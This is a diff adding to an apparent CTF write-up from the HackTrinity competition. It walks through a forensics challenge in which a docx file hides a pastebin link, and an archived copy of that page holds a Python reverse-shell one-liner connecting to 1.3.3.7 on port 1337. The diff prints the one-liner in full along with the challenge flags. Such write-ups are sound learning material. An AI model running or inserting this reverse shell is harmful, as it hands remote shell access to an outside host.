@@ -113,7 +113,33 @@ I noted that the object 2 data was labelled as flate decode which I had heard of
 {: .box-note}
 **Flag:** HackTrinity{th3_f1ag_supply_cha1ns_ar3_str0ng}
 
-(While the way I went about solving this was somewhat roundabout it was quite interesting to learn about the pdf file format overall so I have no regrets)
+(I ended up solving this in quite the roundabout way as you can see but hopefully it helped you learn something about the pdf file format)
+
+### Forensics - Out of Office
+
+Similar to "Panic" you were given a "hacked.docx" file and told to investigate it. It didn't take me long to discover that a docx file can actually be unzipped by most decompression tools therefore I used 7zip and was greeted by a handful of files and folders.
+
+![HackTrinity_Out_Of_Office1.JPG]({{site.baseurl}}/img/HackTrinity_Out_Of_Office1.JPG)
+
+After some searching around I opened one of the xml files called "item1.xml" and found the following pastebin url:
+
+![HackTrinity_Out_Of_Office1.JPG]({{site.baseurl}}/img/HackTrinity_Out_Of_Office2.JPG)
+
+_However_ after quickly copying it over to my browser it returned a page not found error? I was left stumped for a short while before thinking of a website I had used many a time in the past called the .[Wayback Machine](https://archive.org/web/) which stores archived versions of webpages. Sure enough there was one snapshot saved of this pastebin url and bingo some code was hidden within:
+
+```python
+python - c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.3.3.7",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'#
+all the 1337 hackers have a signature right ? SGFja1RyaW5pdHl7QWxXQHk1X0MxM2FOX1VwX0BmdDNyX3kwdVJfSEBjazV9Cg ==
+```
+
+From the looks of things it opens a reverse connection on port 1337 to your machine. I was wondering where to go from here and thought maybe I should listen for traffic on said port or something along those lines when I realised that there was no way this code ever ran as the pastebin url was invalid. That's when I remembered the base64 encoded string at the bottom. When decoded it in fact returns the flag.
+
+{: .box-note}
+**Flag:** HackTrinity{AlW@y5_C13aN_Up_@ft3r_y0uR_H@ck5}
+
+## The End
+
+That's it for all the challenges I was able to solve this time around! I attempted many others but never quie finished them, although I came quite close on some :( . I hope this write up was informative in some way or atleast will inspire others to try out CTFs as they really are quite a lot of fun. One problem I have is a feeling this write up wasn't worded overly well and comes across as some kind of first person report rather then a fun read, therefore I vow to come back and try fix that some time in the future. I hope you enjoyed and thanks for reading :D
 
 
 
